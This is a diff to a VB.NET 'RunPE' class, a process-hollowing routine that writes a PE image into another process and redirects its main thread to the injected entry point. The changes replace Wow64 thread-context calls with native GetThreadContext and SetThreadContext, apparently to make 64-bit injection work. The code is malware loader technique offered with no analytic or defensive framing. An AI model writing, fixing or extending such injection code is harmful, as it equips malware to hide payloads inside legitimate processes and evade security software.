@@ -21,6 +21,7 @@ Public Class RunPE
         End If
         Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)
 
+
         Dim baseAddress As IntPtr = Marshal.AllocHGlobal(lpBuffer.Length)
         Marshal.Copy(lpBuffer, 0, baseAddress, lpBuffer.Length)
         Dim dosHeader As IMAGE_DOS_HEADER = Marshal.PtrToStructure(baseAddress, GetType(IMAGE_DOS_HEADER))
@@ -117,8 +118,8 @@ Public Class RunPE
         Else
             Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
             Marshal.WriteInt64(ptr, ImageBase64)
-            context64.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
-            If Not Wow64GetThreadContext64(pi.hThread, context64) Then
+            context64.ContextFlags = CONTEXT64_FLAGS.CONTEXT64_INTEGER
+            If Not GetThreadContext(pi.hThread, context64) Then
                 GoTo retexit
             End If
             If Not WriteProcessMemory(hHandle, New IntPtr(CLng(context64.Rdx + 16)), ptr, 8, IntPtr.Zero) Then
@@ -126,7 +127,7 @@ Public Class RunPE
             End If
             Marshal.FreeHGlobal(ptr)
             context64.Rcx = pImageBase + AddressOfEntryPoint
-            If Not Wow64SetThreadContext64(pi.hThread, context64) Then
+            If Not SetThreadContext(pi.hThread, context64) Then
                 GoTo retexit
             End If
         End If
